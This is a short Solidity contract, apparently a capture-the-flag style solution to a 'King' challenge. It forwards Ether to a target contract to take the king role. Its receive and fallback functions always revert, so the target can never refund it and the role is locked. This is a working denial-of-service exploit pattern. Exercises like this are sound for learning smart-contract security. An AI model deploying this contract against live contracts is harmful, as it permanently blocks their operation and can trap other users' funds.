// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttacker {

  constructor() public  {
  }

  function attack(address _kingImplementation) external payable {
    (bool success,) = _kingImplementation.call.value(msg.value)("");
    require(success);
  }

   receive() external payable {
    require(false);
  }

  fallback() external {
    require(false);
  }
}